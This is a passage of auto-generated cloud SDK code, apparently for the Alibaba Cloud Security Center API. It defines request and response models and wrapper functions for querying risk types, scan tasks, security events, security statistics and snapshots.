  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskItemType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskItemTypeRequest
  * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemType(request: DescribeRiskItemTypeRequest): DescribeRiskItemTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskItemTypeWithOptions(request, runtime);
}

model DescribeRiskListCheckResultRequest {
  currentPage?: int32(name='CurrentPage'),
  instanceIds?: [ string ](name='InstanceIds'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeRiskListCheckResultResponseBody = {
  list?: [ 
    {
      instanceId?: string(name='InstanceId'),
      riskCount?: long(name='riskCount'),
    }
  ](name='List'),
  requestId?: string(name='RequestId'),
}

model DescribeRiskListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskListCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskListCheckResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResultWithOptions(request: DescribeRiskListCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskListCheckResultRequest
  * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResult(request: DescribeRiskListCheckResultRequest): DescribeRiskListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskListCheckResultWithOptions(request, runtime);
}

model DescribeRiskTypeRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeRiskTypeResponseBody = {
  requestId?: string(name='RequestId'),
  riskTypes?: [ 
    {
      alias?: string(name='Alias'),
      subTypes?: [ 
        {
          alias?: string(name='Alias'),
          checkDetails?: [ 
            {
              checkDesc?: string(name='CheckDesc'),
              checkId?: long(name='CheckId'),
              checkItem?: string(name='CheckItem'),
              rules?: [ 
                {
                  optional?: int32(name='Optional'),
                  paramList?: [ 
                    {
                      enumValue?: string(name='EnumValue'),
                      maxValue?: int32(name='MaxValue'),
                      minValue?: int32(name='MinValue'),
                      paramDefaultValue?: string(name='ParamDefaultValue'),
                      paramDesc?: string(name='ParamDesc'),
                      paramName?: string(name='ParamName'),
                      paramType?: int32(name='ParamType'),
                    }
                  ](name='ParamList'),
                  ruleDesc?: string(name='RuleDesc'),
                  ruleId?: string(name='RuleId'),
                }
              ](name='Rules'),
            }
          ](name='CheckDetails'),
          typeName?: string(name='TypeName'),
        }
      ](name='SubTypes'),
      typeName?: string(name='TypeName'),
    }
  ](name='RiskTypes'),
}

model DescribeRiskTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskTypeResponseBody(name='body'),
}

async function describeRiskTypeWithOptions(request: DescribeRiskTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRiskType(request: DescribeRiskTypeRequest): DescribeRiskTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskTypeWithOptions(request, runtime);
}

model DescribeRisksRequest {
  lang?: string(name='Lang'),
  limit?: int32(name='Limit'),
  riskId?: long(name='RiskId'),
  riskName?: string(name='RiskName'),
}

model DescribeRisksResponseBody = {
  requestId?: string(name='RequestId'),
  risks?: [ 
    {
      riskDetail?: string(name='RiskDetail'),
      riskId?: long(name='RiskId'),
      riskName?: string(name='RiskName'),
      riskType?: string(name='RiskType'),
      subRiskType?: string(name='SubRiskType'),
      subTypeAlias?: string(name='SubTypeAlias'),
      typeAlias?: string(name='TypeAlias'),
    }
  ](name='Risks'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeRisksResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRisksResponseBody(name='body'),
}

async function describeRisksWithOptions(request: DescribeRisksRequest, runtime: Util.RuntimeOptions): DescribeRisksResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.limit)) {
    query['Limit'] = request.limit;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRisks',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRisks(request: DescribeRisksRequest): DescribeRisksResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRisksWithOptions(request, runtime);
}

model DescribeSasPmAgentListRequest {
  lang?: string(name='Lang'),
  uuids?: string(name='Uuids'),
}

model DescribeSasPmAgentListResponseBody = {
  requestId?: string(name='RequestId'),
  sasPmAgentList?: [ 
    {
      aliyunAssistId?: string(name='AliyunAssistId'),
      aliyunMonitorId?: string(name='AliyunMonitorId'),
      assistInstallResult?: int32(name='AssistInstallResult'),
      assistInstallStatus?: int32(name='AssistInstallStatus'),
      monitorInstallResult?: int32(name='MonitorInstallResult'),
      monitorInstallStatus?: int32(name='MonitorInstallStatus'),
      uuid?: string(name='Uuid'),
    }
  ](name='SasPmAgentList'),
}

model DescribeSasPmAgentListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSasPmAgentListResponseBody(name='body'),
}

async function describeSasPmAgentListWithOptions(request: DescribeSasPmAgentListRequest, runtime: Util.RuntimeOptions): DescribeSasPmAgentListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSasPmAgentList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSasPmAgentList(request: DescribeSasPmAgentListRequest): DescribeSasPmAgentListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSasPmAgentListWithOptions(request, runtime);
}

model DescribeScanTaskProgressRequest {
  taskId?: long(name='TaskId'),
}

model DescribeScanTaskProgressResponseBody = {
  requestId?: string(name='RequestId'),
  scanTaskProgress?: string(name='ScanTaskProgress'),
  targetInfo?: string(name='TargetInfo'),
}

model DescribeScanTaskProgressResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskProgressResponseBody(name='body'),
}

async function describeScanTaskProgressWithOptions(request: DescribeScanTaskProgressRequest, runtime: Util.RuntimeOptions): DescribeScanTaskProgressResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskProgress',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeScanTaskProgress(request: DescribeScanTaskProgressRequest): DescribeScanTaskProgressResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskProgressWithOptions(request, runtime);
}

model DescribeScanTaskStatisticsRequest {
  levels?: string(name='Levels'),
}

model DescribeScanTaskStatisticsResponseBody = {
  dealedRiskNum?: int32(name='DealedRiskNum'),
  personalTaskNum?: long(name='PersonalTaskNum'),
  requestId?: string(name='RequestId'),
  totalTaskNum?: long(name='TotalTaskNum'),
  userNum?: long(name='UserNum'),
}

model DescribeScanTaskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskStatisticsResponseBody(name='body'),
}

async function describeScanTaskStatisticsWithOptions(request: DescribeScanTaskStatisticsRequest, runtime: Util.RuntimeOptions): DescribeScanTaskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeScanTaskStatistics(request: DescribeScanTaskStatisticsRequest): DescribeScanTaskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskStatisticsWithOptions(request, runtime);
}

model DescribeSearchConditionRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model DescribeSearchConditionResponseBody = {
  conditionList?: [ 
    {
      conditionType?: string(name='ConditionType'),
      filterConditions?: string(name='FilterConditions'),
      name?: string(name='Name'),
      nameKey?: string(name='NameKey'),
    }
  ](name='ConditionList'),
  requestId?: string(name='RequestId'),
}

model DescribeSearchConditionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSearchConditionResponseBody(name='body'),
}

async function describeSearchConditionWithOptions(request: DescribeSearchConditionRequest, runtime: Util.RuntimeOptions): DescribeSearchConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSearchCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSearchCondition(request: DescribeSearchConditionRequest): DescribeSearchConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSearchConditionWithOptions(request, runtime);
}

model DescribeSecureSuggestionRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSecureSuggestionResponseBody = {
  requestId?: string(name='RequestId'),
  suggestions?: [ 
    {
      detail?: [ 
        {
          description?: string(name='Description'),
          subType?: string(name='SubType'),
          title?: string(name='Title'),
        }
      ](name='Detail'),
      points?: int32(name='Points'),
      suggestType?: string(name='SuggestType'),
    }
  ](name='Suggestions'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeSecureSuggestionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecureSuggestionResponseBody(name='body'),
}

async function describeSecureSuggestionWithOptions(request: DescribeSecureSuggestionRequest, runtime: Util.RuntimeOptions): DescribeSecureSuggestionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecureSuggestion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecureSuggestion(request: DescribeSecureSuggestionRequest): DescribeSecureSuggestionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecureSuggestionWithOptions(request, runtime);
}

model DescribeSecurityCheckScheduleConfigRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId'),
  riskCheckJobConfig?: {
    daysOfWeek?: string(name='DaysOfWeek'),
    endTime?: int32(name='EndTime'),
    startTime?: int32(name='StartTime'),
  }(name='RiskCheckJobConfig'),
}

model DescribeSecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeSecurityCheckScheduleConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfigWithOptions(request: DescribeSecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribeSecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeSecurityCheckScheduleConfigRequest
  * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfig(request: DescribeSecurityCheckScheduleConfigRequest): DescribeSecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityCheckScheduleConfigWithOptions(request, runtime);
}

model DescribeSecurityEventOperationStatusRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventIds?: [ string ](name='SecurityEventIds'),
  sourceIp?: string(name='SourceIp'),
  taskId?: long(name='TaskId'),
}

model DescribeSecurityEventOperationStatusResponseBody = {
  requestId?: string(name='RequestId'),
  securityEventOperationStatusResponse?: {
    securityEventOperationStatuses?: [ 
      {
        errorCode?: string(name='ErrorCode'),
        securityEventId?: string(name='SecurityEventId'),
        status?: string(name='Status'),
      }
    ](name='SecurityEventOperationStatuses'),
    taskStatus?: string(name='TaskStatus'),
  }(name='SecurityEventOperationStatusResponse'),
}

model DescribeSecurityEventOperationStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationStatusResponseBody(name='body'),
}

async function describeSecurityEventOperationStatusWithOptions(request: DescribeSecurityEventOperationStatusRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperationStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityEventOperationStatus(request: DescribeSecurityEventOperationStatusRequest): DescribeSecurityEventOperationStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationStatusWithOptions(request, runtime);
}

model DescribeSecurityEventOperationsRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName'),
          filedName?: string(name='FiledName'),
          markMisType?: string(name='MarkMisType'),
          markMisValue?: string(name='MarkMisValue'),
          supportedMisType?: [ string ](name='SupportedMisType'),
          uuid?: string(name='Uuid'),
        }
      ](name='MarkField'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName'),
          filedName?: string(name='FiledName'),
          markMisValue?: string(name='MarkMisValue'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkFieldsSource'),
      operationCode?: string(name='OperationCode'),
      operationParams?: string(name='OperationParams'),
      userCanOperate?: boolean(name='UserCanOperate'),
    }
  ](name='SecurityEventOperationsResponse'),
}

model DescribeSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationsResponseBody(name='body'),
}

async function describeSecurityEventOperationsWithOptions(request: DescribeSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityEventOperations(request: DescribeSecurityEventOperationsRequest): DescribeSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationsWithOptions(request, runtime);
}

model DescribeSecurityStatInfoRequest {
  lang?: string(name='Lang'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSecurityStatInfoResponseBody = {
  attackEvent?: {
    dateArray?: [ string ](name='DateArray'),
    totalCount?: int32(name='TotalCount'),
    valueArray?: [ string ](name='ValueArray'),
  }(name='AttackEvent'),
  healthCheck?: {
    dateArray?: [ string ](name='DateArray'),
    highCount?: int32(name='HighCount'),
    highList?: [ string ](name='HighList'),
    levelsOn?: [ string ](name='LevelsOn'),
    lowCount?: int32(name='LowCount'),
    lowList?: [ string ](name='LowList'),
    mediumCount?: int32(name='MediumCount'),
    mediumList?: [ string ](name='MediumList'),
    timeArray?: [ string ](name='TimeArray'),
    totalCount?: int32(name='TotalCount'),
    valueArray?: [ string ](name='ValueArray'),
  }(name='HealthCheck'),
  requestId?: string(name='RequestId'),
  securityEvent?: {
    dateArray?: [ string ](name='DateArray'),
    levelsOn?: [ string ](name='LevelsOn'),
    remindCount?: int32(name='RemindCount'),
    remindList?: [ string ](name='RemindList'),
    seriousCount?: int32(name='SeriousCount'),
    seriousList?: [ string ](name='SeriousList'),
    suspiciousCount?: int32(name='SuspiciousCount'),
    suspiciousList?: [ string ](name='SuspiciousList'),
    timeArray?: [ string ](name='TimeArray'),
    totalCount?: int32(name='TotalCount'),
    valueArray?: [ string ](name='ValueArray'),
  }(name='SecurityEvent'),
  success?: boolean(name='Success'),
  vulnerability?: {
    asapCount?: int32(name='AsapCount'),
    asapList?: [ string ](name='AsapList'),
    dateArray?: [ string ](name='DateArray'),
    laterCount?: int32(name='LaterCount'),
    laterList?: [ string ](name='LaterList'),
    levelsOn?: [ string ](name='LevelsOn'),
    nntfCount?: int32(name='NntfCount'),
    nntfList?: [ string ](name='NntfList'),
    timeArray?: [ string ](name='TimeArray'),
    totalCount?: int32(name='TotalCount'),
    valueArray?: [ string ](name='ValueArray'),
  }(name='Vulnerability'),
}

model DescribeSecurityStatInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityStatInfoResponseBody(name='body'),
}

async function describeSecurityStatInfoWithOptions(request: DescribeSecurityStatInfoRequest, runtime: Util.RuntimeOptions): DescribeSecurityStatInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityStatInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityStatInfo(request: DescribeSecurityStatInfoRequest): DescribeSecurityStatInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityStatInfoWithOptions(request, runtime);
}

model DescribeServiceLinkedRoleStatusRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole'),
}

model DescribeServiceLinkedRoleStatusResponseBody = {
  requestId?: string(name='RequestId'),
  roleStatus?: {
    status?: boolean(name='Status'),
  }(name='RoleStatus'),
}

model DescribeServiceLinkedRoleStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeServiceLinkedRoleStatusResponseBody(name='body'),
}

async function describeServiceLinkedRoleStatusWithOptions(request: DescribeServiceLinkedRoleStatusRequest, runtime: Util.RuntimeOptions): DescribeServiceLinkedRoleStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeServiceLinkedRoleStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeServiceLinkedRoleStatus(request: DescribeServiceLinkedRoleStatusRequest): DescribeServiceLinkedRoleStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeServiceLinkedRoleStatusWithOptions(request, runtime);
}

model DescribeSimilarEventScenariosRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSimilarEventScenariosResponseBody = {
  requestId?: string(name='RequestId'),
  scenarios?: [ 
    {
      code?: string(name='Code'),
    }
  ](name='Scenarios'),
}

model DescribeSimilarEventScenariosResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarEventScenariosResponseBody(name='body'),
}

async function describeSimilarEventScenariosWithOptions(request: DescribeSimilarEventScenariosRequest, runtime: Util.RuntimeOptions): DescribeSimilarEventScenariosResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarEventScenarios',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSimilarEventScenarios(request: DescribeSimilarEventScenariosRequest): DescribeSimilarEventScenariosResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarEventScenariosWithOptions(request, runtime);
}

model DescribeSimilarSecurityEventsRequest {
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  taskId?: long(name='TaskId'),
}

model DescribeSimilarSecurityEventsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  securityEventsResponse?: [ 
    {
      eventName?: string(name='EventName'),
      eventType?: string(name='EventType'),
      lastTime?: long(name='LastTime'),
      occurrenceTime?: long(name='OccurrenceTime'),
      securityEventId?: long(name='SecurityEventId'),
      uuid?: string(name='Uuid'),
    }
  ](name='SecurityEventsResponse'),
}

model DescribeSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarSecurityEventsResponseBody(name='body'),
}

async function describeSimilarSecurityEventsWithOptions(request: DescribeSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): DescribeSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSimilarSecurityEvents(request: DescribeSimilarSecurityEventsRequest): DescribeSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarSecurityEventsWithOptions(request, runtime);
}

model DescribeSnapshotsRequest {
  apiVersion?: string(name='ApiVersion'),
  currentPage?: int32(name='CurrentPage'),
  isAliYunEcs?: string(name='IsAliYunEcs'),
  machineRegion?: string(name='MachineRegion'),
  machineRemark?: string(name='MachineRemark'),
  nextToken?: string(name='NextToken'),
  pageSize?: int32(name='PageSize'),
  statusList?: string(name='StatusList'),
  uuid?: string(name='Uuid'),
}

model DescribeSnapshotsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    nextToken?: string(name='NextToken'),
    pageSize?: int32(name='PageSize'),
